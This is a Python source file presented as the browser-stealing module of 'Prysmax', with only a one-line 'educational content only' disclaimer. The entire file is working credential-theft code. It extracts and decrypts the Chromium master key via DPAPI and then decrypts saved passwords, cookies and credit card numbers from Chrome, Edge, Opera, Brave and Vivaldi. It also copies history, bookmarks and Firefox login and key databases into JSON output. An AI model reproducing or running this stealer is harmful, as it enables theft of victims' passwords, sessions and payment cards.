#!/usr/bin/env python3
"""
Prysmax Browser Stealer Module
Educational content only
"""

import os
import sys
import json
import sqlite3
import shutil
import base64
from pathlib import Path
from datetime import datetime

try:
    import win32crypt
    from Crypto.Cipher import AES
    WINDOWS_AVAILABLE = True
except ImportError:
    WINDOWS_AVAILABLE = False

class BrowserStealer:
    def __init__(self, output_dir):
        self.output_dir = output_dir
        self.browsers = {
            "Chrome": {
                "path": os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data"),
                "profiles": ["Default", "Profile 1", "Profile 2", "Profile 3"]
            },
            "Edge": {
                "path": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data"),
                "profiles": ["Default", "Profile 1", "Profile 2"]
            },
            "Firefox": {
                "path": os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"),
                "profiles": []
            },
            "Opera": {
                "path": os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera Stable"),
                "profiles": ["Default"]
            },
            "Brave": {
                "path": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data"),
                "profiles": ["Default", "Profile 1"]
            },
            "Vivaldi": {
                "path": os.path.expanduser("~\\AppData\\Local\\Vivaldi\\User Data"),
                "profiles": ["Default"]
            }
        }
        
    def steal(self):
        """Main browser stealing function"""
        try:
            browser_dir = os.path.join(self.output_dir, "Browsers")
            os.makedirs(browser_dir, exist_ok=True)
            
            for browser_name, browser_info in self.browsers.items():
                try:
                    self.steal_browser_data(browser_name, browser_info, browser_dir)
                except Exception as e:
                    print(f"[BROWSER] Error stealing {browser_name}: {e}")
                    
        except Exception as e:
            print(f"[BROWSER] General error: {e}")
    
    def steal_browser_data(self, browser_name, browser_info, output_dir):
        """Steal data from specific browser"""
        browser_path = browser_info["path"]
        
        if not os.path.exists(browser_path):
            return
        
        browser_output = os.path.join(output_dir, browser_name)
        os.makedirs(browser_output, exist_ok=True)
        
        # Get master key for Chromium-based browsers
        master_key = None
        if browser_name in ["Chrome", "Edge", "Opera", "Brave", "Vivaldi"]:
            master_key = self.get_master_key(browser_path)
        
        # Handle Firefox profiles differently
        if browser_name == "Firefox":
            self.steal_firefox_data(browser_path, browser_output)
        else:
            # Chromium-based browsers
            for profile in browser_info["profiles"]:
                profile_path = os.path.join(browser_path, profile)
                if os.path.exists(profile_path):
                    self.steal_chromium_profile(profile_path, browser_output, profile, master_key)
    
    def get_master_key(self, browser_path):
        """Get master key for Chromium-based browsers"""
        try:
            if not WINDOWS_AVAILABLE:
                return None
                
            local_state_path = os.path.join(browser_path, "Local State")
            if not os.path.exists(local_state_path):
                return None
            
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
            
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except Exception as e:
            print(f"[BROWSER] Error getting master key: {e}")
            return None
    
    def decrypt_password(self, encrypted_password, master_key):
        """Decrypt password using master key"""
        try:
            if not WINDOWS_AVAILABLE or not master_key:
                return "N/A"
                
            if encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v11':
                # AES encryption
                iv = encrypted_password[3:15]
                encrypted_password = encrypted_password[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                return cipher.decrypt(encrypted_password)[:-16].decode()
            else:
                # DPAPI encryption
                return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
        except Exception as e:
            return "Decrypt Error"
    
    def steal_chromium_profile(self, profile_path, output_dir, profile_name, master_key):
        """Steal data from Chromium profile"""
        profile_output = os.path.join(output_dir, profile_name)
        os.makedirs(profile_output, exist_ok=True)
        
        # Steal passwords
        self.steal_passwords(profile_path, profile_output, master_key)
        
        # Steal cookies
        self.steal_cookies(profile_path, profile_output, master_key)
        
        # Steal history
        self.steal_history(profile_path, profile_output)
        
        # Steal bookmarks
        self.steal_bookmarks(profile_path, profile_output)
        
        # Steal credit cards
        self.steal_credit_cards(profile_path, profile_output, master_key)
    
    def steal_passwords(self, profile_path, output_dir, master_key):
        """Steal saved passwords"""
        try:
            login_db_path = os.path.join(profile_path, "Login Data")
            if not os.path.exists(login_db_path):
                return
            
            # Copy database to avoid locks
            temp_db = os.path.join(output_dir, "temp_login.db")
            shutil.copy2(login_db_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            passwords = []
            
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                if encrypted_password:
                    password = self.decrypt_password(encrypted_password, master_key)
                    passwords.append({
                        "url": url,
                        "username": username,
                        "password": password
                    })
            
            conn.close()
            os.remove(temp_db)
            
            # Save passwords
            if passwords:
                with open(os.path.join(output_dir, "passwords.json"), "w") as f:
                    json.dump(passwords, f, indent=2)
                    
        except Exception as e:
            print(f"[BROWSER] Error stealing passwords: {e}")
    
    def steal_cookies(self, profile_path, output_dir, master_key):
        """Steal cookies"""
        try:
            cookies_db_path = os.path.join(profile_path, "Network", "Cookies")
            if not os.path.exists(cookies_db_path):
                cookies_db_path = os.path.join(profile_path, "Cookies")
            
            if not os.path.exists(cookies_db_path):
                return
            
            temp_db = os.path.join(output_dir, "temp_cookies.db")
            shutil.copy2(cookies_db_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            cookies = []
            
            for row in cursor.fetchall():
                host, name, encrypted_value = row
                if encrypted_value:
                    value = self.decrypt_password(encrypted_value, master_key)
                    cookies.append({
                        "host": host,
                        "name": name,
                        "value": value
                    })
            
            conn.close()
            os.remove(temp_db)
            
            if cookies:
                with open(os.path.join(output_dir, "cookies.json"), "w") as f:
                    json.dump(cookies, f, indent=2)
                    
        except Exception as e:
            print(f"[BROWSER] Error stealing cookies: {e}")
    
    def steal_history(self, profile_path, output_dir):
        """Steal browsing history"""
        try:
            history_db_path = os.path.join(profile_path, "History")
            if not os.path.exists(history_db_path):
                return
            
            temp_db = os.path.join(output_dir, "temp_history.db")
            shutil.copy2(history_db_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000")
            history = []
            
            for row in cursor.fetchall():
                url, title, visit_count, last_visit = row
                history.append({
                    "url": url,
                    "title": title,
                    "visit_count": visit_count,
                    "last_visit": last_visit
                })
            
            conn.close()
            os.remove(temp_db)
            
            if history:
                with open(os.path.join(output_dir, "history.json"), "w") as f:
                    json.dump(history, f, indent=2)
                    
        except Exception as e:
            print(f"[BROWSER] Error stealing history: {e}")
    
    def steal_bookmarks(self, profile_path, output_dir):
        """Steal bookmarks"""
        try:
            bookmarks_path = os.path.join(profile_path, "Bookmarks")
            if os.path.exists(bookmarks_path):
                shutil.copy2(bookmarks_path, os.path.join(output_dir, "bookmarks.json"))
        except Exception as e:
            print(f"[BROWSER] Error stealing bookmarks: {e}")
    
    def steal_credit_cards(self, profile_path, output_dir, master_key):
        """Steal saved credit cards"""
        try:
            cards_db_path = os.path.join(profile_path, "Web Data")
            if not os.path.exists(cards_db_path):
                return
            
            temp_db = os.path.join(output_dir, "temp_cards.db")
            shutil.copy2(cards_db_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards")
            cards = []
            
            for row in cursor.fetchall():
                name, encrypted_number, exp_month, exp_year = row
                if encrypted_number:
                    card_number = self.decrypt_password(encrypted_number, master_key)
                    cards.append({
                        "name": name,
                        "number": card_number,
                        "exp_month": exp_month,
                        "exp_year": exp_year
                    })
            
            conn.close()
            os.remove(temp_db)
            
            if cards:
                with open(os.path.join(output_dir, "credit_cards.json"), "w") as f:
                    json.dump(cards, f, indent=2)
                    
        except Exception as e:
            print(f"[BROWSER] Error stealing credit cards: {e}")
    
    def steal_firefox_data(self, firefox_path, output_dir):
        """Steal Firefox data"""
        try:
            # Firefox uses different structure
            for profile_dir in os.listdir(firefox_path):
                profile_path = os.path.join(firefox_path, profile_dir)
                if os.path.isdir(profile_path):
                    self.steal_firefox_profile(profile_path, output_dir, profile_dir)
        except Exception as e:
            print(f"[BROWSER] Error stealing Firefox data: {e}")
    
    def steal_firefox_profile(self, profile_path, output_dir, profile_name):
        """Steal data from Firefox profile"""
        try:
            profile_output = os.path.join(output_dir, profile_name)
            os.makedirs(profile_output, exist_ok=True)
            
            # Copy important Firefox files
            files_to_copy = [
                "places.sqlite",  # History and bookmarks
                "cookies.sqlite",  # Cookies
                "logins.json",     # Passwords
                "key4.db",         # Master key
                "cert9.db"         # Certificates
            ]
            
            for file_name in files_to_copy:
                file_path = os.path.join(profile_path, file_name)
                if os.path.exists(file_path):
                    shutil.copy2(file_path, os.path.join(profile_output, file_name))
                    
        except Exception as e:
            print(f"[BROWSER] Error stealing Firefox profile: {e}")

